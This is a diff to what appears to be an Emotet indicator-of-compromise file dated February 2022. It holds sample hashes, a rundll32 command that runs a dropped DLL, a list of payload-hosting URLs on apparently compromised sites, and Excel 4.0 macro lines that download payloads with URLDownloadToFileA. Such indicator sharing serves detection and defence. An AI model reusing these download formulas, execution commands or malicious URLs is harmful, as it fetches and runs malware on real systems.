@@ -1,5 +1,25 @@
 Emotet 2022 - 04.02.2022 - epoch4
 
+.xls c7996375f6b429374ba45894b04963720e8fd6768e56e5abda76fd77fa91e962
+
+.dll 4ebbfad4e6645e0f423c753fe521cc3979821d0fba0461bc6e064479acc82410
+
+C:\Windows\System32\cmd.exe" /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\vbkwk.dll,dfsgeresd
+
+http://goyaluat.vmesh.in/0v6kcny/CG/
+https://mars.srl/wp-admin/7Ffk6LLN2Xs2W/
+http://franmulero.es/mbx/8c5RBJx6/
+http://varafood.com/Ajax/cnM91G/
+https://7jcat.com/wp-content/t/
+http://blog.centralhome.hu/wp-content/pB1RfPCnBlS1WfpcOL/
+http://zimrights.co.zw/oldsite/k0EoCWycU9tNo1d/
+https://mudhands.com/error/BfH/
+http://albatrospatagonia.com/phkcvt/t53ceSMDqgPQlq/
+http://mapcommunications.co.zw/wp-admin/mdRRbSdU3aB7Xpx6z/
+http://odconsult.co.uk/ALFA_DATA/HHr0FqOXAn62/
+http://dushkin.net/img/bhQSTNicEMtNQxP/
+
+
 ************************************************************************************************************
 
 .xls 81bdf1ecf3b3db164fc52bbc64118e57f7cb02db7ada35c94fa5a85602d08c08
@@ -23,6 +43,8 @@ C:\Windows\SysWOW64\rundll32.exe "C:\Windows\SysWOW64\Rbhperfghjq\mteekk.jdv",Dl
 =CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://sabaithaimassage.com.au/wp-admin/Hgbn3e/", "..\wlw.ocx")
 =CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://wiremax.avaspadan.com/admin/ItopibIZF3dxpy0/", "..\wlw.ocx")
 =CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://troopsites.com/wp-admin/CzMJm2vfbA4osSHH/", "..\wlw.ocx")
+
+
 
 c2's
 
